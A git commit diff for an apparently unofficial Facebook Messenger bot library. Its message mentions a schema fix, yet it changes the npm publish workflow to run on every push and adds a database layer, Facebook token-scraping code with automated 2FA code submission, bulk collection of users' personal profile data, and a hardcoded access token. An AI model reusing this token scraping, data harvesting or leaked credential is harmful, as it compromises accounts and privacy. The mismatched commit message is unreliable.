commit aee82a429cbfa296755252a550f1f4bd3ce01e36
Author: JakeClark <jakeclark38b@gmail.com>
Date:   Tue Dec 9 11:53:04 2025 +0700

    Update mongoose schema to handle null values in optional fields

diff --git a/.github/workflows/publish.yml b/.github/workflows/publish.yml
index 5a48c6792..64558dfcd 100644
--- a/.github/workflows/publish.yml
+++ b/.github/workflows/publish.yml
@@ -1,33 +1,20 @@
-name: Publish Package to npmjs
+name: "publish npm"
 
-on:
-  release:
-    types: [published]
-  workflow_dispatch: # ðŸ‘ˆ allows you to trigger manually from the Actions tab
+on: push
 
 jobs:
-  publish:
-    runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      id-token: write
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v5
-
-      - name: Setup Node.js
-        uses: actions/setup-node@v6
-        with:
-          node-version: '24.x'
-          registry-url: 'https://registry.npmjs.org'
-
-      - name: Install dependencies
-        run: npm install
-
-      - name: browser build
-        run: npm run build-browser
-
-      - name: Dry run publish with provenance
-        run: npm publish --provenance --access public
-        env:
-          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+    publish:
+        runs-on: ubuntu-latest
+        steps:
+            - name: checkout
+              uses: actions/checkout@v2
+            - name: node
+              uses: actions/setup-node@v2
+              with:
+                  node-version: 14
+                  registry-url: https://registry.npmjs.org
+            - name: publish
+              run: npm publish --access public
+#               working-directory: package.json
+              env:
+                  NODE_AUTH_TOKEN: ${{secrets.NPM_AUTH_TOKEN}}
diff --git a/Extra/Database/index.js b/Extra/Database/index.js
new file mode 100644
index 000000000..f6b43b300
--- /dev/null
+++ b/Extra/Database/index.js
@@ -0,0 +1,360 @@
+var get = require('lodash/get'),
+    set = require('lodash/set'),
+    got = require("got"),
+    BetterDB = require("better-sqlite3"),
+    db = new BetterDB(__dirname + "/SyntheticDatabase.sqlite");
+var ReplitURL = process.env.REPLIT_DB_URL
+var ReplID = ReplID
+module.exports = { 
+    get: function(key, ops,forceFuction) {
+        if (ReplID == undefined || forceFuction) {
+            if (!key)
+                throw new TypeError(
+                    "No key specified."
+                );
+            return arbitrate("fetch", { id: key, ops: ops || {} });
+        }   
+        else return got(ReplitURL + "/" + key)
+        .then((StrValue) => {
+            var strValue = StrValue.body
+
+            if (ops && ops.raw) return strValue;
+                if (!strValue) return null;
+            try {
+                var value = JSON.parse(strValue);
+            } catch (_err) {
+                throw new SyntaxError(
+                `Failed to parse value of ${key}, try passing a raw option to get the raw value`
+                );
+            }
+            if (value === null || value === undefined) {
+                return null;
+            }
+            return value;
+        });
+    },
+
+    set: function(key, value,forceFuction) {
+        if (ReplID == undefined || forceFuction) {
+            if (!key)
+                throw new TypeError(
+                    "No key specified."
+                );
+            return arbitrate("set",{
+                stringify: false,
+                id: key,
+                data: value,
+                ops:  {},
+            });
+        }
+        else return got(ReplitURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: encodeURIComponent(key) + "=" + encodeURIComponent(JSON.stringify(value)),
+        });
+    },
+    has: function(key,forceFuction) {
+        if (ReplID == undefined || forceFuction) {
+            if (!key)
+                throw new TypeError(
+                    "No key specified."
+                );
+            return arbitrate("has", { id: key, ops: {} });
+        }
+        else return got(ReplitURL + "/" + key)
+            .then((StrValue) => {          
+                var strValue = StrValue.body
+                if (strValue === "") return false;
+                return true;
+            });
+    },
+    delete: function(key,forceFuction) {
+        if (ReplID == undefined || forceFuction) {
+            if (!key)
+                throw new TypeError(
+                    "No key specified."
+                );
+            return arbitrate("delete", { id: key, ops: {} });
+        }
+        else return got(ReplitURL + "/" + key, {
+            method: "DELETE",
+        });
+    },
+
+    deleteMultiple: function(forceFuction,...args) {
+        if (ReplID == undefined || forceFuction) {
+            if (!key)
+                throw new TypeError(
+                    "No key specified."
+                );
+                try {
+                    for (let i of args) {
+                        arbitrate("delete", { id: i, ops: {} });
+                    }
+                    return true;
+                } 
+            catch (err) {
+                return false;
+            }
+        }
+        else {
+            const promises = [];
+
+            for (const arg of args) {
+                promises.push(this.delete(arg));
+            }
+        
+            Promise.all(promises);
+        
+            return this;
+        }
+    },
+
+    empty: async function(forceFuction) {
+        if (ReplID == undefined || forceFuction) {
+            return arbitrate("clear");
+        }
+        else {
+            const promises = [];
+            for (const key of await this.list()) {
+                promises.push(this.delete(key));
+            }
+        
+            Promise.all(promises);
+        
+            return this;
+        }
+    },
+
+    list: async function(forceFuction) {
+        if (ReplID == undefined || forceFuction) {
+            return arbitrate("all",{ ops: {} });
+        }
+        else {
+            return got(
+                ReplitURL + `?encode=true&prefix=${encodeURIComponent(true)}`
+            )
+                .then((t) => {
+                var strValue = t.body
+                if (strValue.length === 0) {
+                    return [];
+                }
+                return strValue.split("\n").map(decodeURIComponent);
+            });
+        }
+    }
+}
+
+var methods = {
+    fetch: function(db, params, options) {
+        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);
+        if (!fetched) return null;
+        try { 
+            fetched = JSON.parse(fetched.json)
+        } catch (e) {
+            fetched = fetched.json;
+        }
+        if (params.ops.target) fetched = get(fetched, params.ops.target);
+        return fetched;
+    },
+    set: function(db, params, options) {
+        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);
+        if (!fetched) {
+            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');
+            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);
+        }
+        try { 
+            fetched = JSON.parse(fetched); 
+        } catch (e) {
+            fetched = fetched;
+        }
+        if (typeof fetched === 'object' && params.ops.target) {
+            params.data = JSON.parse(params.data);
+            params.data = set(fetched, params.ops.target, params.data);
+        } 
+        else if (params.ops.target) throw new TypeError('Cannot target a non-object.');
+        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(JSON.stringify(params.data), params.id);
+        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;
+        if (newData === '{}') return null;
+        else {
+            try { newData = JSON.parse(newData); 
+            } 
+            catch (e) {
+                newData = newData;
+            }
+            return newData;
+        }
+    },
+    add: function addDB(db, params, options) {
+        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);
+        if (!fetched) {
+            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');
+            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); 
+        }
+        if (params.ops.target) {
+            try { 
+                fetched = JSON.parse(fetched) 
+            }
+            catch (e) {
+                fetched = fetched;
+            }
+            let oldValue = get(fetched, params.ops.target);
+            if (oldValue === undefined) oldValue = 0;
+            else if (isNaN(oldValue)) throw new Error(`Data @ ID: "${params.id}" IS NOT A number.\nFOUND: ${fetched}\nEXPECTED: number`);
+            params.data = set(fetched, params.ops.target, oldValue + JSON.parse(params.data));
+        } 
+        else {
+            if (fetched.json === '{}') fetched.json = 0;
+            try { 
+                fetched.json = JSON.parse(fetched) 
+            } catch (e) {
+                fetched.json = fetched.json;
+            }
+            if (isNaN(fetched.json)) throw new Error(`Data @ ID: "${params.id}" IS NOT A number.\nFOUND: ${fetched.json}\nEXPECTED: number`);
+            params.data = parseInt(fetched.json, 10) + parseInt(params.data, 10);
+        }
+        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(JSON.stringify(params.data), params.id);
+        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;
+        if (newData === '{}') return null;
+        else {
+            try {  
+                newData = JSON.parse(newData); 
+            } 
+            catch (e) {
+                newData = newData;
+            }
+            return newData;
+        }
+    },
+    subtract: function subtractDB(db, params, options) {
+       let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);
+        if (!fetched) {
+            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');
+            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); 
+        }
+        if (params.ops.target) {
+            try { fetched = JSON.parse(fetched); } catch (e) {}
+            params.data = JSON.parse(params.data);
+            let oldValue = get(fetched, params.ops.target);
+            if (oldValue === undefined) oldValue = 0;
+            else if (isNaN(oldValue)) throw new Error('Target is not a number.');
+            params.data = set(fetched, params.ops.target, oldValue - params.data);
+        } else {
+            if (fetched.json === '{}') fetched.json = 0;
+            else fetched.json = JSON.parse(fetched.json);
+            try { fetched.json = JSON.parse(fetched); } catch (e) {}
+            if (isNaN(fetched.json)) throw new Error('Target is not a number.');
+            params.data = parseInt(fetched.json, 10) - parseInt(params.data, 10);
+        }
+        params.data = JSON.stringify(params.data);
+        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(params.data, params.id);
+        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;
+        if (newData === '{}') return null;
+        else {
+            try { newData = JSON.parse(newData); } catch (e) {}
+            return newData;
+        }
+    },
+    push: function pushDB(db, params, options) {
+        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);
+        if (!fetched) {
+            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');
+            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); 
+        }
+        if (params.ops.target) {
+            fetched = JSON.parse(fetched.json);
+        try { fetched = JSON.parse(fetched) } catch (e) {}
+            params.data = JSON.parse(params.data);
+        if (typeof fetched !== 'object') throw new TypeError('Cannot push into a non-object.');
+        let oldArray = get(fetched, params.ops.target);
+        if (oldArray === undefined) oldArray = [];
+        else if (!Array.isArray(oldArray)) throw new TypeError('Target is not an array.');
+            oldArray.push(params.data);
+            params.data = set(fetched, params.ops.target, oldArray);
+        } else {
+        if (fetched.json === '{}') fetched.json = [];
+        else fetched.json = JSON.parse(fetched.json);
+        try { fetched.json = JSON.parse(fetched.json); } catch (e) {}
+            params.data = JSON.parse(params.data);
+        if (!Array.isArray(fetched.json)) throw new TypeError('Target is not an array.');
+            fetched.json.push(params.data);
+            params.data = fetched.json;
+        }
+        params.data = JSON.stringify(params.data);
+        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(params.data, params.id);
+        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;
+        if (newData === '{}') return null;
+        else {
+            newData = JSON.parse(newData)
+        try { newData = JSON.parse(newData) } catch (e) {}
+        return newData
+        }
+    },
+    delete: function deleteDB(db, params, options) {
+        const unset = require('lodash/unset');
+        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);
+        if (!fetched) return false;
+        else fetched = JSON.parse(fetched.json);
+        try { fetched = JSON.parse(fetched); } catch (e) {}
+        if (typeof fetched === 'object' && params.ops.target) {
+            unset(fetched, params.ops.target);
+            fetched = JSON.stringify(fetched);
+            db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(fetched, params.id);
+        return true;
+        }
+        else if (params.ops.target) throw new TypeError('Target is not an object.');
+        else db.prepare(`DELETE FROM ${options.table} WHERE ID = (?)`).run(params.id);
+        return true;
+    },
+    has: function hasDB(db, params, options) {
+        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);
+        if (!fetched) return false;
+        else fetched = JSON.parse(fetched.json);
+        try { fetched = JSON.parse(fetched) } catch (e) {}
+        if (params.ops.target) fetched = get(fetched, params.ops.target);
+        return (typeof fetched != 'undefined');
+    },
+    all: function allDB(db, params, options) {
+        var stmt = db.prepare(`SELECT * FROM ${options.table} WHERE ID IS NOT NULL`);
+        let resp = [];
+        for (var row of stmt.iterate()) {
+            try {
+            resp.push({
+                ID: row.ID,
+                data: JSON.parse(row.json)
+            });
+            } 
+            catch (e) {
+                return [];
+            }
+        }
+        return resp;
+    },
+    type: function typeDB(db, params, options) {
+        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);
+        if (!fetched) return null; // If empty, return null
+        fetched = JSON.parse(fetched.json);
+        try { fetched = JSON.parse(fetched); } catch (e) {}
+        if (params.ops.target) fetched = get(fetched, params.ops.target); // Get prop using dot notation
+        return typeof fetched;
+    },
+    clear: function clearDB(db, params, options) {
+        let fetched = db.prepare(`DELETE FROM ${options.table}`).run();
+        if(!fetched) return null;
+        return fetched.changes;
+        
+    }
+};
+
+function arbitrate(method, params, tableName) {
+    let options = {table: "json"};
+    db.prepare(`CREATE TABLE IF NOT EXISTS ${options.table} (ID TEXT, json TEXT)`).run();
+    if (params.ops.target && params.ops.target[0] === ".") params.ops.target = params.ops.target.slice(1); // Remove prefix if necessary
+    if (params.data && params.data === Infinity) throw new TypeError(`You cannot set Infinity into the database @ ID: ${params.id}`);
+    if (params.id && typeof params.id == "string" && params.id.includes(".")) {
+        let unparsed = params.id.split(".");
+        params.id = unparsed.shift();
+        params.ops.target = unparsed.join(".");
+    }
+    return methods[method](db, params, options);
+}
diff --git a/Extra/ExtraAddons.js b/Extra/ExtraAddons.js
new file mode 100644
index 000000000..cf888b4ea
--- /dev/null
+++ b/Extra/ExtraAddons.js
@@ -0,0 +1,80 @@
+'use strict';
+
+var utils = require('../utils');
+var logger = require('../logger')
+var OTP = require('totp-generator');
+
+module.exports.getInfo = async function (id,jar,ctx,defaultFuncs) {
+    var AccessToken = await module.exports.getAccessToken(jar,ctx,defaultFuncs);
+    var { body:Data } = await utils.get(`https://graph.facebook.com/${id}?fields=name,first_name,email,about,birthday,gender,website,hometown,link,location,quotes,relationship_status,significant_other,username,subscribers.limite(0)&access_token=${AccessToken}`,jar,null,ctx.globalOptions);
+    var Format = {
+        id: JSON.parse(Data).id || "No data",
+        name: JSON.parse(Data).name || "No data",
+        first_name: JSON.parse(Data).first_name || "No data",
+        username: JSON.parse(Data).username || "No data",
+        link: JSON.parse(Data).link || "No data",
+        verified: JSON.parse(Data).verified || "No data",
+        about: JSON.parse(Data).about || "No data",
+        avatar: `https://graph.facebook.com/${id}/picture?height=1500&width=1500&access_token=1449557605494892|aaf0a865c8bafc314ced5b7f18f3caa6` || "No data",
+        birthday: JSON.parse(Data).birthday || "No data",
+        follow: JSON.parse(Data).subscribers.summary.total_count || "No data",
+        gender: JSON.parse(Data).gender || "No data",
+        hometown: JSON.parse(Data).hometown || "No data",
+        email: JSON.parse(Data).email || "No data",
+        interested_in: JSON.parse(Data).interested_in || "No data",
+        location: JSON.parse(Data).location || "No data",
+        locale: JSON.parse(Data).locale || "No data",
+        relationship_status: JSON.parse(Data).relationship_status || "No data",
+        love: JSON.parse(Data).significant_other || "No data",
+        website: JSON.parse(Data).website || "No data",
+        quotes: JSON.parse(Data).quotes || "No data",
+        timezone: JSON.parse(Data).timezone || "No data",
+        updated_time: JSON.parse(Data).updated_time || "No data"
+    }
+    return Format;
+}
+
+/**
+ * Help: @ManhG
+ * Author: @KanzuWakazaki
+*/
+
+module.exports.getAccessToken = async function (jar, ctx,defaultFuncs) {
+    if (global.Fca.Data.AccessToken) {
+        return global.Fca.Data.AccessToken;
+    }
+    else {
+        var netURLS = "https://business.facebook.com/security/twofactor/reauth/enter/"
+        return defaultFuncs.get('https://business.facebook.com/business_locations', jar, null, ctx.globalOptions).then(async function(data) {
+            try {
+                if (/"],\["(.*?)","/.exec(/LMBootstrapper(.*?){"__m":"LMBootstrapper"}/.exec(data.body)[1])[1])  {
+                    global.Fca.Data.AccessToken = /"],\["(.*?)","/.exec(/LMBootstrapper(.*?){"__m":"LMBootstrapper"}/.exec(data.body)[1])[1];
+                    return /"],\["(.*?)","/.exec(/LMBootstrapper(.*?){"__m":"LMBootstrapper"}/.exec(data.body)[1])[1];
+                }
+            }
+            catch (_) {
+                if (global.Fca.Require.Priyansh.AuthString.includes('|')) return logger.Error(global.Fca.Require.Language.Index.Missing)
+                var OPTCODE = global.Fca.Require.Priyansh.AuthString.includes(" ") ? global.Fca.Require.Priyansh.AuthString.replace(RegExp(" ", 'g'), "") : global.Fca.Require.Priyansh.AuthString;
+                var Form = { 
+                    approvals_code: OTP(String(OPTCODE)),
+                    save_device: true,
+                    lsd: utils.getFrom(data.body, "[\"LSD\",[],{\"token\":\"", "\"}")
+                }
+                return defaultFuncs.post(netURLS, jar, Form, ctx.globalOptions, { 
+                    referer: "https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness_locations&type=avoid_bypass&app_id=0&save_device=1",
+                }).then(async function(data) {
+                    if (String(data.body).includes(false)) throw { Error: "Invaild OTP | PriyanshFca.json: AuthString" }
+                    return defaultFuncs.get('https://business.facebook.com/business_locations', jar, null, ctx.globalOptions,{ 
+                        referer: "https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness_locations&type=avoid_bypass&app_id=0&save_device=1",
+                    }).then(async function(data) {
+                        var Access_Token = /"],\["(.*?)","/.exec(/LMBootstrapper(.*?){"__m":"LMBootstrapper"}/.exec(data.body)[1])[1];
+                        global.Fca.Data.AccessToken = Access_Token;
+                        return Access_Token;
+                    });
+                });
+            }
+        })
+    }
+}
+
+//hard working =))
diff --git a/Extra/ExtraFindUID.js b/Extra/ExtraFindUID.js
new file mode 100644
index 000000000..2d20adff8
--- /dev/null
+++ b/Extra/ExtraFindUID.js
@@ -0,0 +1,60 @@
+const got = global.Fca.Require.Fetch;
+
+/**
+ * @param {string | URL} url
+ * @param {{ sendMessage: (arg0: string, arg1: any) => any; }} api
+ */
+async function getUIDSlow(url,api) {
+    var FormData =  require("form-data");
+    var Form = new FormData();
+	var Url = new URL(url);
+    Form.append('username', Url.pathname.replace(/\//g, ""));
+	try {
+        var data = await got.post('https://api.findids.net/api/get-uid-from-username',{
+            body: Form,
+            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Safari/537.36'
+        })
+	} catch (e) {
+        console.log(global.Fca.Data.event.threadID,e)
+        return api.sendMessage("Lá»—i: " + e.message,global.Fca.Data.event.threadID);
+	}
+    if (JSON.parse(data.body.toString()).status != 200) return api.sendMessage('ÄÃ£ bá»‹ lá»—i !',global.Fca.Data.event.threadID)
+    if (typeof JSON.parse(data.body.toString()).error === 'string') return "errr"
+    else return JSON.parse(data.body.toString()).data.id || "ná»‹t";
+}
+
+/**
+ * @param {string | URL} url
+ * @param {{ sendMessage: (arg0: string, arg1: any, arg2: any) => any; }} api
+ */
+async function getUIDFast(url,api) {
+    var FormData =  require("form-data");
+    var Form = new FormData();
+	var Url = new URL(url);
+    Form.append('link', Url.href);
+    try {
+        var data = await got.post('https://id.traodoisub.com/api.php',{
+            body: Form
+        })
+	} catch (e) {
+        return api.sendMessage("Lá»—i: " + e.message,global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);
+	}
+    if (JSON.parse(data.body.toString()).error) return api.sendMessage(JSON.parse(data.body.toString()).error,global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);
+    else return JSON.parse(data.body.toString()).id || "co cai nit huhu";
+}
+
+/**
+ * @param {any} url
+ * @param {any} api
+ */
+async function getUID(url,api) {
+    var getUID = await getUIDFast(url,api);
+        if (!isNaN(getUID) == true) return getUID;  
+            else {
+                let getUID = await getUIDSlow(url,api);
+            if (!isNaN(data) == true) return getUID;
+        else return null;
+    }
+}
+
+module.exports = getUID;        
diff --git a/Extra/ExtraGetThread.js b/Extra/ExtraGetThread.js
new file mode 100644
index 000000000..7affc2cf0
--- /dev/null
+++ b/Extra/ExtraGetThread.js
@@ -0,0 +1,118 @@
+/* eslint-disable */
+"use strict";
+var Database = require("../Extra/Database");
+var { lastRun,capture } = require('./Src/Last-Run');
+var logger = require("../logger");
+var getText = global.Fca.getText;
+var language = require("../Language/index.json");
+language = language.find(i => i.Language == require(process.cwd() + "/PriyanshFca.json").Language).Folder.ExtraGetThread;
+
+exports.createData = function(threadID,threadData) {
+    try { 
+        Database.set(String(threadID),Object(threadData),true);
+        logger.Normal(getText(language.CreateDatabaseSuccess,String(threadID)));
+    }
+    catch (e) {
+        console.log(e);
+        logger.Warning(getText(language.CreateDatabaseFailure,String(threadID))); 
+    }
+}
+
+exports.updateData = function(threadID,threadData) {
+    try { 
+        Database.set(String(threadID),Object(threadData),true);
+        logger.Normal(getText(language.updateDataSuccess,String(threadID)));
+    }
+    catch (e) {
+        console.log(e);
+        logger.Warning(getText(language.updateDataFailure,String(threadID))); 
+    }
+}
+
+exports.updateMessageCount = function(threadID,threadData) {
+    try { 
+        Database.set(String(threadID),Object(threadData),true);
+    }
+    catch (e) {
+        console.log(e);
+    }
+}
+
+exports.getData = function(threadID) {
+    switch (Database.has(String(threadID),true)) {
+        case true: {
+            return Database.get(String(threadID),{},true)
+        }
+        case false: {
+            return null;
+        }
+    }
+}
+
+exports.deleteAll = function(data) {
+    for (let i of data) {
+        Database.delete(String(i),true);
+    }
+}
+
+exports.getAll = function() {
+    return Database.list(true);
+}
+
+exports.hasData = function(threadID) {
+    return Database.has(String(threadID),true);
+}
+
+exports.alreadyUpdate = function(threadID) {
+    var Time = Database.get(String(threadID),{},true).TimeUpdate;
+        try { 
+            if (global.Fca.startTime >= (Time + (3600 * 1000))) {
+                logger.Normal(getText(language.alreadyUpdate, String(threadID)));
+                return true;
+            }
+            else return false;
+        }
+        catch (e) { 
+            console.log(e);
+        return true;
+    }
+}
+
+exports.readyCreate = function(Name) {
+    switch (Database.has(String(Name),true)) {
+        case true: {
+            if (Number(global.Fca.startTime) >= Number(Database.get(String(Name),{},true) + (120 * 1000))) {
+                return true;
+            }   
+            else {
+                return false;
+            }
+        }
+        case false: {
+            return false;
+        }
+    }
+}
+
+exports.setLastRun = function(Name,LastRun) {
+    Database.set(String(Name),String(lastRun(LastRun)),true);
+}
+
+exports.getLastRun = function(Name) {
+    switch (Database.has(String(Name),true)) {
+        case true: {
+            return Database.get(String(Name),{},true);
+        }
+        case false: {
+            try {
+                capture(Name)
+                this.setLastRun(Name,Name);
+                return Database.get(String(Name),{},true);
+            }
+            catch(e) {
+                console.log(e);
+                return Date.now();
+            }
+        }
+    }
+}
diff --git a/Extra/ExtraScreenShot.js b/Extra/ExtraScreenShot.js
new file mode 100644
index 000000000..96163f1ea
--- /dev/null
+++ b/Extra/ExtraScreenShot.js
@@ -0,0 +1,430 @@
+/* global document */
+'use strict';
+const {promisify} = require('util');
+const fs = require('fs');
+const fileUrl = require('file-url');
+const puppeteer = require('puppeteer');
+const toughCookie = require('tough-cookie');
+
+const writeFile = promisify(fs.writeFile);
+
+const isUrl = string => /^(https?|file):\/\/|^data:/.test(string);
+
+const scrollToElement = (element, options) => {
+	const isOverflown = element => {
+		return (
+			element.scrollHeight > element.clientHeight ||
+			element.scrollWidth > element.clientWidth
+		);
+	};
+
+	const findScrollParent = element => {
+		if (element === undefined) {
+			return;
+		}
+
+		if (isOverflown(element)) {
+			return element;
+		}
+
+		return findScrollParent(element.parentElement);
+	};
+
+	const calculateOffset = (rect, options) => {
+		if (options === undefined) {
+			return {
+				x: rect.left,
+				y: rect.top
+			};
+		}
+
+		const offset = options.offset || 0;
+
+		switch (options.offsetFrom) {
+			case 'top':
+				return {
+					x: rect.left,
+					y: rect.top + offset
+				};
+			case 'right':
+				return {
+					x: rect.left - offset,
+					y: rect.top
+				};
+			case 'bottom':
+				return {
+					x: rect.left,
+					y: rect.top - offset
+				};
+			case 'left':
+				return {
+					x: rect.left + offset,
+					y: rect.top
+				};
+			default:
+				throw new Error('Invalid `scrollToElement.offsetFrom` value');
+		}
+	};
+
+	const rect = element.getBoundingClientRect();
+	const offset = calculateOffset(rect, options);
+	const parent = findScrollParent(element);
+
+	if (parent !== undefined) {
+		parent.scrollIntoView(true);
+		parent.scrollTo(offset.x, offset.y);
+	}
+};
+
+const disableAnimations = () => {
+	const rule = `
+		*,
+		::before,
+		::after {
+			animation: initial !important;
+			transition: initial !important;
+		}
+	`;
+
+	const style = document.createElement('style');
+	document.body.append(style);
+
+	style.sheet.insertRule(rule);
+};
+
+const getBoundingClientRect = element => {
+	const {top, left, height, width, x, y} = element.getBoundingClientRect();
+	return {top, left, height, width, x, y};
+};
+
+const parseCookie = (url, cookie) => {
+	if (typeof cookie === 'object') {
+		return cookie;
+	}
+
+	const jar = new toughCookie.CookieJar(undefined, {rejectPublicSuffixes: false});
+	jar.setCookieSync(cookie, url);
+	const returnValue = jar.serializeSync().cookies[0];
+
+	// Use this instead of the above when the following issue is fixed:
+	// https://github.com/salesforce/tough-cookie/issues/149
+	// const ret = toughCookie.parse(cookie).serializeSync();
+
+	returnValue.name = returnValue.key;
+	delete returnValue.key;
+
+	if (returnValue.expires) {
+		returnValue.expires = Math.floor(new Date(returnValue.expires) / 1000);
+	}
+
+	return returnValue;
+};
+
+const imagesHaveLoaded = () => [...document.images].map(element => element.complete);
+
+const captureWebsite = async (input, options) => {
+	options = {
+		inputType: 'url',
+		width: 1920,
+		height: 1080,
+		scaleFactor: 2,
+		fullPage: false,
+		defaultBackground: true,
+		timeout: 60, // The Puppeteer default of 30 is too short
+		delay: 0,
+		debug: false,
+		darkMode: true,
+		launchOptions: { devtools:true },
+		_keepAlive: true,
+		isJavaScriptEnabled: true,
+		inset: 0,
+        args: ["--webview-disable-safebrowsing-support",
+        "--disable-web-security"],
+        ignoreHTTPSErrors: true,
+		...options
+	};
+
+	const isHTMLContent = options.inputType === 'html';
+
+	input = isHTMLContent || isUrl(input) ? input : fileUrl(input);
+
+	const timeoutInSeconds = options.timeout * 1000;
+
+	const viewportOptions = {
+		width: options.width,
+		height: options.height,
+		deviceScaleFactor: options.scaleFactor
+	};
+
+	const screenshotOptions = {};
+
+	if (options.type) {
+		screenshotOptions.type = options.type;
+	}
+
+	if (options.quality) {
+		screenshotOptions.quality = options.quality * 100;
+	}
+
+	if (options.fullPage) {
+		screenshotOptions.fullPage = options.fullPage;
+	}
+
+	if (typeof options.defaultBackground === 'boolean') {
+		screenshotOptions.omitBackground = !options.defaultBackground;
+	}
+
+	const launchOptions = {...options.launchOptions};
+
+	if (options.debug) {
+		launchOptions.headless = false;
+		launchOptions.slowMo = 100;
+	}
+
+	const browser = options._browser || await puppeteer.launch(launchOptions);
+	const page = await browser.newPage();
+
+	if (options.preloadFunction) {
+		await page.evaluateOnNewDocument(options.preloadFunction);
+	}
+
+	await page.setJavaScriptEnabled(options.isJavaScriptEnabled);
+
+	if (options.debug) {
+		page.on('console', message => {
+			let {url, lineNumber, columnNumber} = message.location();
+			lineNumber = lineNumber ? `:${lineNumber}` : '';
+			columnNumber = columnNumber ? `:${columnNumber}` : '';
+			const location = url ? ` (${url}${lineNumber}${columnNumber})` : '';
+			console.log(`\nPage log:${location}\n${message.text()}\n`);
+		});
+
+		page.on('pageerror', error => {
+			console.log('\nPage error:', error, '\n');
+		});
+
+		// TODO: Add more events from https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#event-requestfailed
+	}
+
+	if (options.authentication) {
+		await page.authenticate(options.authentication);
+	}
+
+	if (options.cookies) {
+		const cookies = options.cookies.map(cookie => parseCookie(isHTMLContent ? 'about:blank' : input, cookie));
+		await page.setCookie(...cookies);
+	}
+
+	if (options.headers) {
+		await page.setExtraHTTPHeaders(options.headers);
+	}
+
+	if (options.userAgent) {
+		await page.setUserAgent(options.userAgent);
+	}
+
+	await page.setViewport(viewportOptions);
+
+	if (options.emulateDevice) {
+		if (!(options.emulateDevice in puppeteer.devices)) {
+			throw new Error(`The device name \`${options.emulateDevice}\` is not supported`);
+		}
+
+		await page.emulate(puppeteer.devices[options.emulateDevice]);
+	}
+
+	await page.emulateMediaFeatures([{
+		name: 'prefers-color-scheme',
+		value: options.darkMode ? 'dark' : 'light'
+	}]);
+
+	await page[isHTMLContent ? 'setContent' : 'goto'](input, {
+		timeout: timeoutInSeconds,
+		waitUntil: 'networkidle2'
+	});
+	if (options.disableAnimations) {
+		await page.evaluate(disableAnimations, options.disableAnimations);
+	}
+
+	if (options.hideElements) {
+		await page.addStyleTag({
+			content: `${options.hideElements.join(', ')} { visibility: hidden !important; }`
+		});
+	}
+
+	if (options.removeElements) {
+		await page.addStyleTag({
+			content: `${options.removeElements.join(', ')} { display: none !important; }`
+		});
+	}
+
+	if (options.clickElement) {
+		await page.click(options.clickElement);
+	}
+
+	const getInjectKey = (ext, value) => isUrl(value) ? 'url' : (value.endsWith(`.${ext}`) ? 'path' : 'content');
+
+	if (!options.isJavaScriptEnabled) {
+		// Enable JavaScript again for `modules` and `scripts`.
+		await page.setJavaScriptEnabled(true);
+	}
+
+	if (options.modules) {
+		await Promise.all(options.modules.map(module_ => {
+			return page.addScriptTag({
+				[getInjectKey('js', module_)]: module_,
+				type: 'module'
+			});
+		}));
+	}
+
+	if (options.scripts) {
+		await Promise.all(options.scripts.map(script => {
+			return page.addScriptTag({
+				[getInjectKey('js', script)]: script
+			});
+		}));
+	}
+
+	if (options.styles) {
+		await Promise.all(options.styles.map(style => {
+			return page.addStyleTag({
+				[getInjectKey('css', style)]: style
+			});
+		}));
+	}
+
+	if (options.waitForElement) {
+		await page.waitForSelector(options.waitForElement, {
+			visible: true,
+			timeout: timeoutInSeconds
+		});
+	}
+
+	if (options.beforeScreenshot) {
+		await options.beforeScreenshot(page, browser);
+	}
+
+	if (options.element) {
+		await page.waitForSelector(options.element, {
+			visible: true,
+			timeout: timeoutInSeconds
+		});
+		screenshotOptions.clip = await page.$eval(options.element, getBoundingClientRect);
+		screenshotOptions.fullPage = false;
+	}
+
+	if (options.delay) {
+		await page.waitForTimeout(options.delay * 1000);
+	}
+
